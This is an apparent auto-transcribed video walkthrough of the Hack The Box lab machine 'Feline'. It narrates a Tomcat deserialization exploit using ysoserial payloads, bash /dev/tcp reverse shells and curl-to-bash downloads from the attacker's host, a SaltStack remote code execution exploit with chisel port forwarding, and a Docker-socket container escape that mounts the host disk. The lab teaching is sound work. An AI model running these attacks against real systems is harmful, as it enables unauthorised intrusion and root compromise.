 what's going on youtube this is ipsec i'm doing feline from hack the box which was a super fun box that involved three main exploits the very first one is a java deserialization attack against apache tomcat and the first half of the vulnerability is pretty obvious you can write to the file system the second part isn't so obvious the version of tomcat has an actual directory traversal within the cookie how it handles the session and if you do that directory traversal and point the cookie to a file that's on disk it would deserialize it and that opens an attack path in this case it's with the common utils library once you get a shell to the box you find that salt is running which is vulnerable to the salt stack vulnerability so you do that and get code execution which lands you on a docker instance and this docker is configured to have the docker socket available on this instance which then allows you to interact with the docker api spin up a new container have it run a command and also mount the host disk to itself so with all that being said let's jump in as always begin with the nmap so dash sc for default scripts sv enumerate versions oh a i'll put all formats put in the nmap directory and call it feline and then the ip address which is 10 10 10 205. can take some time to run so i've already ran it looking at the results we have just three ports open the first one being ssh on port 22 and it's a ubuntu server we also have http on port 8080 and it's running apache tomcat9027 so there's two things i want to do right off the bat the very first thing is just go over to the web page 101010 205 8080 and because it is tomcat i want to check for the management interfaces so i'm going to try slash admin manager and slash manager html and the status code was always 404 which is not found if it was i think like 403 forbidden then i know this was loaded but i just can't access it it being 404 means um even with like cross-site request forgery i don't think i'd be able to access this interface if you don't know what the manager interface for tomcat is it just lets you upload web apps to it so you can just upload a reverse shell and get a quick win so because all these pages were 404 i'm probably not going to think about abusing the admin interface for this machine now the next thing i want to look at is we have open ssh and apache tomcat so the tomcat is a verbose version number 9027 which means we can probably find out the exact day the software is released to find out if it's out of date or not this open ssh 802 p1 ubuntu 4 um it's not really giving us a unique version number so if we google this i'm sure there's probably like a release that we can't see oh let's see this is probably the package uh 2020 zero three thirty maybe this is it i'm actually not positive um maybe this 4 is the release i wonder if there is a 1 3 that is also in focal uh doesn't look like it's in anything one two not there so i'm not exactly sure when this is released but it does tell us that we do have focal here so maybe it's this p version i don't know i need to look more into ssh versioning to find out where i was going there but we can edit this to say um this is most likely a ubuntu focal box and maybe ssh was sh maybe from uh 20 2003 now we can look at this tomcat so nine zero two seven so if we google apache tomcat9027 um i'm gonna search changelog and generally when i have specific version numbers i always just append change log to my search because the change log gets released when the version gets released and you can generally pull the version name or version date right out of the page if it's not displayed here you can always check like the xml source look at check the html source to see if it's in the metadata download some images on the page look at the exif data or go in the xml feed and look at the dates the feed posted so we can see 90227 was released 2019 october 11th which is pretty old when you consider the next release wasn't released generally this can happen if it's just not a stable release there's security issues there's a bunch of reasons why they just won't do a release but the next one is 2019 november 21st and going back to our nmap we know this machine was released around march at least because that's the first version for this ubuntu ssh so we can see december 12th uh february 11th i'd accept probably february 11th and stop digging into tomcat vulnerabilities uh not released then march 16th so uh at nine zero three three or nine zero three one is when i considered tomcat to be relatively up to date if it wasn't beyond that then just it would be great but being from 2019 is old especially when this machine was probably released around like the july september time frame so let's do released 2019 november 11th and we can move on to our merry way so if there was a like rce in tomcat that you don't need creds or anything for i'd assume i would know about it so i'm not going to go into googling all that instead i'm just going to look at this page now to see what we have right off the bat it's just a virus bucket and we got a slider here that doesn't really have too much information i know i can click this third slider somehow there we go so nothing here so i'm going to click on home service and blog to see what each page is uh home looks like is the same as the index the one thing we didn't do is a go buster so since it's tomcat i'm going to try index.jsp it's not found and then we got index.html so let's do a go buster dir mode and then dash u http 101010 205 port 8080 word list i now like using opt set list uh discovery web content raft small words dot text and then let's do uh dash x for arguments html i'm just going to call it go buster root dot log so we have a go bus drawing on this app as we work the home page nothing interesting this services page says virus bucket we have a place for an email and sample and then the blog is back to the same if i click read more i don't really get anything i was hoping it would give me like um question mark blog post equals an id number or something and then i'd be able to try sql injection here but it doesn't give me that so let's move on to this it's a virus bucket and it looks like it scans files so the very first thing i want to do is i'm going to google the eicar test string and this is just a string that is generally considered to be a virus well virus you can use it to test scan virus scanners that to make sure they're actually scanning the file so you put this into just where users may be able to upload files to maybe a database some files on the box and stuff and you should have a antivirus alert pop when it scans it if it doesn't then you know your virus scanner is not working so that is what the eicar test string is for so we're going to put that there and i'd highly recommend not doing the e i current test on places you don't have permission to because if you make a virus think the database is a if you make a virus scanner think the database is a virus it could try to delete the database and bad things would happen so definitely don't try playing with those things htb and then we want to do feline eico text and i'm also going to intercept this request just so we can see what it looks like so we get a proxy tab intercept is on analyze and i'm going to send this over to repeater and everything looks fine in this so i'm just going to forward and the reason why i wanted to forward it is not to see this text but also generally when you interact with pages we don't have a cookie here we get a set cookie j session id so i'm assuming now my future request will have that cookie assigned to me so i always like just doing what i can in the browser to make sure i get a cookie the key thing is it says file uploaded successfully and if we look let's turn burp suite off go to 10 10 10 80 and then we caught it what eicar dot text not found maybe we can try like slash uploads eico dot text to see if we can hit it uploads eico.text we can't we can go back over to our go buster we don't have any new directories yet um we can test our eicar string at like virustotal.com and then upload uh let's go hdb feline if you're curious how i'm getting this like typing bar up i'm hitting ctrl l to do that we upload eicar and you can see almost everything detects this as a virus we're 58 out of 63. um looks like last line thinks it's a trojan that's scary malwarebytes doesn't detect this at all i don't know what these other all but malwarebytes not detecting it is actually surprising um the one i want to check is clam av because that's the common av on linux and we didn't check if it was linux but if i ping it 10 10 10 205 this ttl is 63 so we have one route between a one hop between us and the box so it's ttl 64 which means it's a linux variant um if it was 127 here which means 128 i would think it would be a windows box so we know it's linux and it doesn't look like it's um flag in this ei car the other thing we could test is let's change the name to please sub dot text and put um whoops come on thanks and upload this because maybe it just said the file was uploaded and got detected as a virus i mean that's always possible so that's why i'm testing this one we test this on 404 not found and go over here we get not found as well so we don't know how this upload piece is working we can try fuzzing things so we can put um like dot dot slash please sub dot text and we get a invalid file name if we don't put anything at all we'll put like dot dot which would be a directory we get this weird error message so they're not masking errors from us and we can see the um i think call trace or stack trace whatever you want to call this and the very first one is an apache commons error which means there's probably going to be deserialization in this if we can get it to dcl's data and apache commons is just a super super common framework as the name suggests i think if you want to do even like base64 that function is in the apache commons so it's just the common framework that has a lot of public deserialization chains or gadgets out for it uh it all started back in like i think 2015 with this like fox glove security um ibm websphere i think first yeah or weblogic uh weblogic and websphere i get those too confused but this is a good post to read if you don't understand what deserialization attacks are um i have this php deserialization video i'd highly recommend watching both of these this intro and this advanced one um it's a little bit different between languages but the basic concept is the same and i didn't really understand deserialization until i took it apart in a language that was easy for me to read which was php so we have this it failed to write and this is where i'm going to google like apache tomcat volumes so tomcat9027 vulnerability or exploit and poc let's see what it finds redtimmy.com so we look at this there is a cve 2020 8 9484 and i want to look at this it's may 20th 2020. the reason why i wanted to look at this is because i know the box was released like the july september time frame so if this was a december cve i would probably ignore it and then look at it after i root the box because the exploit came out after it was released so i wasn't meant to do this the persistent manager and it's using file store gadgets in the class path so the gadget it's talking about is probably this uh standard manager persistent the exploit so we're sending j session id to looks like a lfi so maybe the exploit itself allows us to do directory traversal and it automatically appends dot session so on this disk um if we go to [Music] oh i don't have it here but let's go here uh refresh this page let's just hit enter intercept is off turn it on uh let's go service darn cache we see this so on this box probably on the local file system it's a pending.session and this is the session data for this so the exploit is saying that we have to find a way to drop a serialized object to the disk and then if we include it via the session id um we can get code execution so the very first thing we want to do is go over to yso serial so why so serial github and the key thing about this i'm just going to for that request but the key thing about this is when you go here you may think you want to go to the releases and download this this is actually the source code still the actual yso serial binary you scroll down and go to the jetpack link and this will let you download it so let's save waiso serial dash master and let's move it so move downloads wiser serial dash master i'm just going to call it yso serial.jar and we can execute it with java jar wiser serial and this tells us a list of all the frameworks it supports so we have a bunch of common collections we go back to our error message let's see it is in repeater we don't have any version number um we could potentially like pull this library up and look at line 394 and get a version number but that's a lot of work when we could just guess it so we're gonna go and guess the version uh the very first one i'm gonna do is common collection seven which is version three one um let's try common collections four i always like starting at the highest version number then going down so let's do common collections for and this is just like the ordered it is in it's not the version number again version numbers off here so common collections for weisser cereal common collections for and then we want to make the server do something i don't like doing curls because i mean if you aren't enough linux boxes you'll realize curl's not always there w get's not always there it's normally one or the other so the one thing that is always going to be on the box is ping so i'm going to do ping 10 10 14 4 and then dash c1 for count one and the reason why is if this application doesn't have threading and you don't do that this ping doesn't end so it's just constantly gonna ping your box and also um if someone ever does a ps they're like why is my box pinging that guy because you have no way of killing it so that's why i like doing ping dash c1 now it's going to give you a bunch of junk so the one thing i like doing is i do base 64 w0 and get it in a big base64 string and then i can also do x-clip dash selection clipboard so now it doesn't go to standard out go straight to my clipboard and we can paste and then use burp suite to decode whoops right click convert selection base64 decode or control shift b and it gets put in here um there shouldn't be a line break at the end of this but if we tried copy and pasting so get rid of all this uh we have all these bad characters uh we can see the terminal things it starts with like sr and has a bunch of just things that don't exist we can try like going straight to a clipboard so selection clipboard and then when we paste we can see this character which just is bad so we can see here's what the start of this looks like here's what the start of this looks like and if we view this in hex let's see if i can do this it should begin with aced so let's see um i guess copy decoder encode as hex aced so we know this is good if i can do it to this other payload this is not going to be aced at least i don't think it is uh yeah fdfd so that's not a valid serialized object serialized objects always begin with aced if we go to that fox glove page uh fox glove security i'm sure it's gonna tell us so aced yep so we can see it here it begins with this the other one is they say aced then triple o five or o five uh it's like r0 a b this is a a64 java object so let's go back to our burp suite and actually upload this and the one thing i'm going to do first is um i'm going to write this to my disk and then upload it again because i don't think this content type now matches what this data is it's definitely not text plain this is like uh octet stream or binary data or something like that so what we're going to do is just write this to um please sub dot session and then we go over to our page root ipsec dot rocks sample please sub dot session send it over to burp suite analyze it upload the file [Music] we didn't have intercept on so i can go to http history and this is it so extract it out of there close that and we'll say this is upload okay so we have the java object on the disk what i want to do now is sudo tcp dump dash i ton zero dash n don't do dns icmp so we want to be able to look at the icmp request and let's just go to this page again or maybe we can go back to our history all i want to do is extract a page that has my cookie there we go so here we do a bunch of dot slashes doesn't matter how many just need enough to get to the root directory we'll call this exec and then we're going to try one thing real quick uh going to press ctrl x to cut this because we need this error message opt sample uploads i did control z which i thought would put this back but it didn't so i'll just paste it and then we want to copy this put it here and then please sub again tomcat itself is going to append that dot session and we just get 200. so we do it quickly we get this http status 500 error and i look back at my box and we have code execution so looks like common collections uh i think the four payload worked so now we want to get a reverse shell so um let's see i'm gonna do echo dash n and we'll do base 60 or not base64 uh ben bash dash c bash dash i dev tcp 10 10 14 4 9 000 1 0 and 1 like this and then basically for it now we can copy this and the reason why i'm doing this is just to avoid bad characters i hate putting like quotes and all those things in my payloads so we can echo this then base64 it or basics would decode it and then execute it with bash so we just wrote it to please sub dot session but we can also uh convert this to base64 and then xclip dash selection uh clipboard is what i want so now we go here upload click paste and then it was ctrl shift whoops that's u uh oh ctrl shift b i'm just gonna paste it again i hit the wrong key uh let's see control shift b there we go so upload and we did four right i am 14 4. ncl vmp 9001 internal server error and we don't have a shell so we can try uploading this again real quick and nothing so that did not work um we can try removing like spaces so let's try that doing this brace expansion technique uh i don't think it needs that so what i'm going to do is we'll copy i just want to run this command to make sure it works uh 10 10 14 4 does not look oh i did not pipe it over the bash echo this no such file so it looks like my command is actually not working so let's copy this base64 paste base64-d oh i screwed up my reverse shell right off the start ah where is it we'll just rewrite it or maybe it's up here uh yeah zero at and one or it's that there we go that's why i forgot so echo base64-d bash here we go over a shell works so we can replace this with this payload and see if it works if we go to upload i tried pasting there it just didn't work so paste again and then ctrl shift b upload exec and we don't get a shell so now we can try the next thing which would be going to the brace expansion to see if it's all these spaces that's annoying us so now a payload doesn't have any spaces and we can test a payload to make sure it still works and hopefully it does yep it does so this is now my clipboard and go back to upload click paste oh we got a bad character there here we go ctrl shift b upload exec it took a second that time but we still don't have a reverse shell so i know there's a way to get it working with this but at some point i just like drawing the line and saying okay i'm over complicating this payload let's go to a simpler one let's do um one payload girl 10 10 14 4 slash sample and pipe it over to bash and then in my feline directory i'm going to make dub dub dub go into simple and this where we put the one liner devtcp 1010 14 4 9001 like that that seems well i'm executing bash let's get rid of this bin bash ah i don't need that bash c actually because this curl script is already executed in bash so i know i'm going to be in that shell so the bash c is a little pointless there we go python3 dash m http server let's make this on port 8000 i guess it's copied let's go to upload paste had some bad characters still come on ctrl shift b uploaded executed uh it did a get but we don't have a shell still so curl localhost 8080 simple bash unexpected token invalid localhost 8080 simple oh eight thousand there we go paper to bash so we should have got a shell so maybe it just doesn't like this reverse shell syntax so what we can do um the shell cheat sheet let's take burp suite off let's see actually um what we could do let's cp simple.simple.back v simple and we go back with our ping so 1010 14 4 and we also want to make sure we always do dash c1 so now when i host this server it should be pinging us so sudo tcp dump ton zero dash n icmp if i call this oh it probably pained me on localhost that's why i'm hoping let's upload execute so it got it but we don't have a ping so it doesn't like probably how we're doing this pipe over to bash so what we can try is dash o uh let's write it to dev shm please work so now we can upload paste what there we go ctrl shift b so we got it again so now it should be on the box and now i'm just going to execute this so we do this payload bash so now we removed all special characters from a request and breaking up into two requests not the most elegant way to do it but when you make things simpler they tend to work more often and we have it banging so this works let's copy um what is it does please work simple simple.back over top of simple and rerun this if we go to upload what if i control z this a few times there we go i think this is gonna be the download payload so we can say download then um prep exec i guess i don't know there we go so web server running reverse shell running so download exec so now we just download and wrote to please work and then we can prep exec to exec and we get a shell that works awesome so that was a long way to do this but hopefully you found like my framework and how i do reverse shells when i have bad characters i'm sure if i played with that longer i could have done it without writing to disk but i mean sometimes you just want to go quick and writing disk is the way to do it so let's get a proper shell so python 3 c import pty pty dot spawn bin bash then stty raw minus echo fg enter twice you don't see um you typing fg but it works and then we can export term is equal to x term so we can clear the screen so now we're on this box the first thing i always like doing is trying to establish some type of persistence in the machine so if my shell dies i can easily get back on so i go to my home directory and create a ssh directory and we get permission denied so i can't drop a public key we probably could now like upload a malicious jsp to the server and do it that way but if the server gets reset then we lose our access so i'm just going to leave it how it is and just make sure i always have my download and prep exec payloads so i can easily get a shell back to the machine the next thing i want to do is make sure i'm where i think i am so i'm going to do an ipaddr and my ip address is 101010 205 so i know i'm on the box there wasn't any type of weird nadding or port forwarding or things like that going on the weird thing though is we have a docker interface so i'm going to do a ls-le on slash and i don't see dot docker n for anything so it doesn't look like we're in a docker but it looks like this is a docker host so i'm gonna run docker ps and we get permission denied when trying to talk to the docker socket because i guess we're just not a member of the docker group if i do an ls-la on this we can see root owns it and docker owns it he can read right to this socket which is how docker works um i guess the next thing to do would be looking at port forwarding stuff or not port forwarding but just open ports to see if there's anything that is getting pushed to the docker because i can't look at the running dockers but because docker is on this box i assume docker is running and there's probably some type of port forwarding going on uh we could probably look at iptables dash l as well do we have permission to uh no we do not have permission to look at ip tables so we see localhost 4505 4506 8000 and 44327 um any one of these ports could be forwarded to the docker we know 8080 is not because we exported that and we're on this box 8005 also could be but i think off top my head that is the ajp port which is the tomcat like port forwarding service so nothing there uh 4506 4505 4506 and 8 000. i'm going to curl each of those so curl localhost 4505 uh http when not allowed http 09 we're not allowed and let's do a thousand and we get empty reply i'm gonna do dash v so i can see the server header that comes back uh we get nothing maybe this is ssl so i'm gonna add a dash k to not um check the certificate and we get something back this is a cherry pie application i have no clue what this is um let's see welcome clients local batch subnet runner looks like it's some type of api um because we're not getting an actual page so we have to find exactly what port this is or where this is so maybe if i do a find slash and then to devnol so we hide things that don't exist and grep for i would do grab dash i cherry p y to see if we can find it cherry pie is kind of like flask so yeah um if i go to slash opt let's see samples this is where we're writing let's see container d permission denied i'm going to google what port 4505 and 4506 is 4505 see it looks like it is part of salt and 45 or sixes as well so salt is a like um content management system and not cms um change management system uh cm so change management or devops or things like that if you're familiar with like ansible chef puppet there's a few other ones but those are the main ones it's just ways for administrators to manage a bunch of servers and there was a recent vulnerability inside of salt called i think uh let's see salt vulnerability exploit i think like salt shack or salt shake um salt stack is the exploit so in order to exploit this or test exploit we have to probably port forward this box or this back to our box we can try to just do it with this payload so this looks like a good cve to test out with so we can try viewing it as raw copy it i guess i could probably just w get it so let's go back to our web server start that go in w get this let's make sure it's python it is move to salt stack dot pi and then cd dev shm and then we're going to wget 10 10 14 4 8 000 salt stack dot pie python three salt stack dot pie see if it runs uh no module name salt so i'm gonna go back to how i did this cherry pie thing with the find and i'm going to look for salt dot pie so we can see it's in user share sos reports i don't know what this is uh egg do i have right access here i do not find.grep salt let's see we can cp salt here to dev shm and see if these libraries are on the box i don't think they are but let's see what happens uh no module named sos so we're getting into a bunch of library issues so what we should do is just run the salt stack exploit on our box and this is working because i've ran it once before so i did pip3 install salt to get rid of that um python library missing thing uh maybe pseudo pip3 install salt oh god and install a library done but yeah cedar pip3 install salt and that will get you up and running the next thing we have to do is run chisel so let's go to github chisel and we have to forward some ports so get clone uh we don't get clone we just want to download releases let's see probably linux amd 64. save mv downloads what was it called chisel and then gunzip dash d to unzip it and i always like renaming it to just chisel so i can execute it easily okay so now we can w get chisel let's go back to that w get command and download chisel so we can do chisel server port if we don't specify a port um it's going to say for it's already in use this is a more clean error message than i'm used to seeing let's see locate chisel if i do a different chisel server this is what i'm used to seeing when it can't listen report so um chisel has apparently been updated to have a cleaner error message when the port is in use which is definitely nice that old port like you just got that huge error messenger like wait what is this air trying to tell me oh the port's in use uh eight thousands in use let's do 8001 and i'm also going to add that dash dash reverse flag in case we want it so that just allows reverse forwards so now we have to execute chisel but this time in client mode and i guess it has to be ch modded chisel what i could assume i downloaded that i wonder if i was in a different directory or something and downloaded it or maybe something clears out device hm but let's see h mod it and execute it come on dot slash chisel client 10 10 14 4 8 000 1 and we want to do a reverse support forward because whenever you do a port forward the client opens up a port and forwards it to the server we want the server to open a port and forward it to us so that is reverse so reverse is when the server opens the port so let's do reverse we'll do 45.05 and we want to forward it on our box to 127.001 4505. oh man my terminal is wonky uh the next thing we probably want is 4506. so 127.001 4506. and then 8000 127.001 this will be um eight thousand two on one twenty seven zero zero one eight thousand i couldn't do um eight thousand listing on this because uh her web server's listing on 8 000. so that's why i did 8002 okay we set up two i wonder if 8002 did not go live we don't see that coral localhost 8002 connection refused um i'm not sure why i did not listen on that honestly maybe it's something oh i didn't do an r um so again now this box is listing on 8002 and forwarding into us because i did not do reverse port forward so if we want to poke at that service we'd have to redo this tunnel um i'm lazy so let's not have to do that yet we'll do it if it comes to that so let's go to dub dub dub where we had the salt stack exploit and if you run it without arguments i thought it would run on port 45 out on local host say dash h let's say dash dash master 12701 it takes a second let's see dash dash read etsy pass wd let's see if we can read this doesn't look like it's working let's see curl localhost 4506. so we're getting the same exact error messages but something is not happening let's see dash p 45 or 6. weird let's take a look at the code real quick and see if it tells us anything uh it looks like it's vulnerable on before 3000.2 and what our application is saying is it is that version i'm going to search this binary for 3000.2 just to make sure like upon failed exploitation it just doesn't say it's this version and i don't see anything so i'm gonna look at version and let's see version okay let's see it's doing check salt version and these are different messages than we're getting we're not getting like this version of salt is not vulnerable so let's try salt stack 4506 4506-h and let's see there was a dash force and we did dash dash force and it didn't change at all dash dash 4 checks like i'm not getting what i'd assume i should get maybe we downloaded it wrong or something let's see let's do salt stack cve if we go to google see cve this see github let's try this cve get clone cd cbe python3 exploit.pi does this one work any differently there we go uh this is actually displaying the things so our previous exploit script for some reason just um didn't work i don't know why but whenever you grab something from github and it's not working you may want to try a different thing now that we have this working we can do the dash h command to get help and you can see it's checking salt master on 127.00145.6 but we can try the dashr for read file so let's try etsy passwd does it actually give us the file and it does um the one thing that's odd is it's not giving us a tomcat user so chances are this is going to be executing in the docker container we could try changing the port to 4505 to see if that does anything different i don't know why salt uses 4506 and 4505 so um yeah i'm guessing that port 8000 was just a web interface but okay 45.5 doesn't work so we can also do the dash h there was an exec so we can try dash dash exec and just like last time we're going to do a ping so done 0 n icmp sudo and dash c1 10 10 14 4 and this one may not work because we know we're running from within a docker container so with that in mind we're just trying this to see if it works and it does so we're good but if it didn't work um i wouldn't call that a deal breaker i just try other things so let's go for a reverse shell and we can try uh bash dash c bash dash i dev tcp ten ten fourteen four nine thousand one zero and one like that and i'm gonna do something i forgot to do on the previous one and run script so this would be script um per sort exploit exit i was wondering if it would append log it doesn't so let's make the shell run script shell post exploit.log so now everything i do in this reverse shell is going to be logged so listening on 9001 running this and we don't get a shell when things don't work i generally do change the quotes so we can try that and then we'll try the same process we did before and just making things simple but right there the quotes is what mattered which is weird normally single quotes work and double quotes don't but in this case it's the other way around um i'm not exactly sure why but that being said we're in this box and if i do ls here we can go back up go two directories to my shell directory and if i cap this um we don't see anything because it's gonna write once this exits so whenever you do these scripts always make sure you exit properly because it may not write right away so i'm gonna exit the shell we do a cat here nothing exit again script done and now it wrote um it may look like it didn't write everything but it's just a terminal trick if i do less on this you can see it does print everything i think less dash c would print colors uh maybe lowercase c i don't know how to actually have it filter these um antsy characters or whatever it is but yep that's it so let's do this exploit again and get a shell so let's run the script command nclvmp uh shoot we have to go to old directory if you don't know cd space dash is the go to previous working directory so now that we're in this docker container let's do python c import pty pty dot spawn ben bash okay s t to y raw minus echo export x term equals uh term is equal to x term so now i can clear the screen so on this dot container we can do our ls-la slash and see we do have that docker m variable we also root on the container and this is weird um normally you start out in a container and then you have to escalate to the host we escalate we went from a underprivileged user on the host to the root of a doc container so we kind of took a step back so because we took a step back in the terms of privacy and kind of gaming the ctf a little bit we can assume there's probably a docker misconfig because why else would you go from low priv machine to root of a docker because generally root of a docker is less permissions than a low priv user so canning to do.txt add salt stack support to auto spawn sandbox dockers through events integrate changes to tomcat and make the service open to public so let's now run some lynn p's i'm going to go into dub dub dub locate lendp's.sh and we have it everywhere uh opt privilege escalation awesome script suite i'm just going to do a get pull to pull the latest it's been a while since i updated it so now we can go to lynn p's and python3 oh wait we already have a web server in a different pane so i can probably just go to dev oh we have carl probably do we yeah so carl 10 10 14 4 8 000 linps.sh pipe it over to bash and what oh cp i did not copy it hdb feline dub dub dub there we go and now i'm gonna let this run so i'm gonna pause the video and yeah so now that this is done we can just go to the very top of the file and we do have a etsy shadow password um i don't think you can crack this one so i'm not even gonna bother trying it's a sha-512 crypt but if i ran into a roadblock for a long time i would try cracking it and if i was doing this black box live i would probably try cracking as well so i always have something running in the background but i just don't feel like including it right now let's see so looking at this um there's gonna be a lot of yellow and red because we are running uh lin p's as root so just because it's yellow and red doesn't mean it's interesting because as it's saying we're in a daca container and one of the things it points out right away is there's this docker sock and remember when we're the low priv user um we couldn't access the docker socket because uh we weren't a member of the docker group but apparently it's exposed in this container and maybe it's exposed because i don't know what this cap dac override is let's see let's see what this privilege does cap deck override uh let's just bypass file read and write okay that's probably like so you can edit um files you don't own it's funny that it's pointing out and highlighting a reverse shell here not the most stealthy of shells we can write to all these paths so we have command injection but again running to a path as root isn't going to really do anything and analyzing socket files and it's highlighting right here that docker sock is writable and it gives us a blog post so if we go to this blog post um we have a few things we can do writing docker socket and there is something else that is a hint that i was hoping this would say but um maybe it won't because it's just buried in noise let's see bash history so it's not highlighting the bash history file um it's highlighted there because i typed it but there is one which is unique for hack the box so if we cat dot bash history um well we can see testing the box but if this was reverted there'd probably only be one line or a few lines so let's do head 10 maybe 20. so they do have a history file and there's a lot of stuff in this history file so we can one of those lines in the history file was this um docker command so running the docker socket uh if we have the docker binary let's see if we do we probably don't because it's normally not in a container so we can't run these and these binaries are just really wrappers around the web api so if we run this command we can see we get a response back so if you googled docker web api let's see uh docker engine api right here and let's see let's go to the latest i guess and let's see it should right here load up and give us a lot of good stuff what okay right here so we can see when we get slash containers json it gives us this information and if we wanted to create a container it gives us information as well if we want to inspect so all that docker ps command is doing is a wrapper around this i'm sure if we do like docker ps um docker ps is mapped to git containers json so we just have to learn how to use this docker api and i don't think we have jq on this box which jq we don't so it's a bit of a pain to view the data because i can't just read this easily so what i'm going to do is i'm going to run netcat and use the k option to keep open so when the command finishes it's just going to keep the socket open and i'm going to put it on 9001 or actually we're going to do 9002 because we've been doing our shelves on 9001. i'm going to pipe this over to cat and then do a dash so it's just cutting whatever we get from netcat to standard l and then i'm going to pipe that over to jq so now i can run this curl command and i'm going to pipe it over to dev tcp 1010 14 2 9002 so i'm sending the output of this curl to here which is this net cat and then it's going to cap the output to give me like a proper standard out and then pipe it to jq i did not do 9002 there we go now it's sending it to here uh nope 10 10 14 4. old habits die hard there we go third time's the charm and now we have that command with a bit easier to read output right at least i like this output it's nice pretty it's colored yeah so you can also do other things like this was images we could do containers and also see the container information so since we can access this docker socket we can actually create a new container and within that new container we can um have it map the root drive to the container and then also run a shell because when this container starts when salt stack starts it runs this command so we create a container that uses the image salt stack because that's what's on the box i think if we go up to the images command uh this is the image we can use salt sandbox okay not sort stacks sandbox is the image um chances are in a real environment you'd see like ubuntu latest here as well and you could use that box or um alpine is another common one so this is just the os and then the command we can put a reverse shell command here and we don't need any of these ports these are the redirection ports so we can see right here this is the saltstack container and it's sending port 8000 to this so listen on 12701 of the host on port 8000 and map it to 8 000. i think that's it maybe public port is on the host and this is in the docker but this is doing those port forwards we don't need any of them though we just need one that shares a um drive the smell so it's doing a mount to copy the docker sock into this container so let's go and create some json so let's do um go into www.v create.json and we need image and we said that was sandbox then we need cmd and let's just try putting a reverse shell here so let's do curl 10 10 14 4 port 8 000 pipe over to bash okay and then we want binds these are going to be the mounting options so mount slash on the host to slash mount in the container and make it read write so now this is the minimal json to create this container so we can curl 10 10 14 4 8 000 create dot json and i'm just gonna w get it cat create.json we have it so we can do curl dash x if we look at create a container it wants a post so post dash capital h content type and if you want to know all the json i'm assuming it's in here you just have to read the page content type we want to tell the server it's json and then dash d is going to allow us to copy a file so dash d and then at is how you do files so create.json i'm going to fix my um tty because now it's just making it hard to read and then dash dash unix dash socket it was ver run um see docker.sock okay then http localhost containers create looks like it created it i'm going to do this so this id is on one line so i can just double click to copy and now we have to do the same thing but start it so containers slash this then start and we don't give it the d flag oh shoot oh man okay so let's fix our tty uh let's see stty dash a i'm gonna run stdy dash a here and i'm gonna take the uh cut rows from here because there's 35 rows so stty rows 34 i may have 7 35 and we want columns 74. so now when i go all the way to the end here it's good okay so now i should easily be able to delete create.json and we want containers the actual container see that's saving um let's just create the container again so there we go containers copy start and let's see executable file not found in path so it looks like it's trying to execute this entire thing um if we v on create.json do we have to nano oh god um i'm not even going to try emacs i don't know how to exit that one so let's just go back here and edit our syntax so it probably wants it to be in this format so in a array like this this way the binary is here and we can do which curl so curl is going to be user bin curl user bin curl okay and then the second argument can be there i'm debating if i want to do like that this could be messy doing multiple commands like this oh well we'll try it what's the worst that can happen w get uh we probably want to do no clobber is that it rm create json w get i'll probably do curls from now on i know there's a command and w get to automatically do that but i do not know it okay now we can go to the start and we want to put the new container and we also nc lvnp [Music] 9001 and apparently it can't access this so let's go back to this and for the cmd i'm going to try ben sh dash command and then we'll just give it this whole command let's see if this one works so let's just do curl 10 10 14 4 8 000 create dot json create.json okay now this one will be create the container and then we need the start command to erase all of this and put the new id it started but it doesn't look like we have anything um i'm looking for my web server and we don't have it ever getting anything what was our create.json we were getting something we're just doing a curl so we should see a connection and we don't we could try was it simple but it doesn't seem to be working download the file create the container and then start the container don't have a shell looking here it only got create.json so that doesn't work um the next thing we could try doing is simplifying it even some more so we don't need this salt stack port anymore so i'm just going to ctrl c that and i'm going to go into temp and we're going to write the reverse shell here so let's w get 10 10 14 4 8 000 simple to we'll just rename it mvsimpletoshell.sh if i cap this file it's going to execute it so what we're going to do here we're going to do bin sh and then we'll do a um ch think root mount sh dash c temp shell dot sh let's try this save curl wait what uh dash o download create.json create the container then we have to start the container started and it doesn't look like that worked either looking in here we still have shell.sh so let's see is this command actually um chmod slash mount i don't think that's it but let's see does this page have anything the hack tracks say search for ben sh see cmd then sh that's not what i want i can try this dash o create shoot that'll create it and we have to start it i should create a like wrapper script around these three commands to speed it up but this is the toughest part probably of these type of exploits is just working around all the bad characters 10 10 14 4 9 000 1. let's see wait what oh it's there we go it's my tty thing i don't think this should fix it but maybe it will under such container create and then let's start it nothing okay so let's start from a fresh late and think this over this one command is definitely ch root that's no way at ch mod so now we're going into slash mount and then we're executing sh i guess we can put quotes around this but i don't think we need quotes around that temp shell.sh let's try this real quick if this doesn't work then i'm going to try to do it all in one line and not use this file okay create.json's there containers create and then let's start this container copy paste cat shell.sh make sure it's still here it is so let's go and edit this again so we want ch root slash mount that's where we have this and then i'm going to do here bash this let's try this curl create and delete all this copy paste there we go so we had to um tell sh to execute bash on the script so wait oh yeah we are root it says we're in a container but keep in mind we have sim linked um what is it we did assembling um a ch root i mean so we see a true to ourselves into slash mount so if i look at temp we can see shell.sh by cat etsy shadow we have the tomcat user actually and if i go into slash root we have root.text so that is i guess maybe i can make this let's try this if you didn't understand what happened maybe if i get rid of this ch root and we're going to sh flash mount like that maybe this will work i actually do not know so curl nclvnp run it and then nope that doesn't work um i'm not sure exactly why but we want to be inside of the host when we do it but we see a route into mount which places us into mount of the server so um yeah hope you guys enjoyed the video take care and i will see you all next week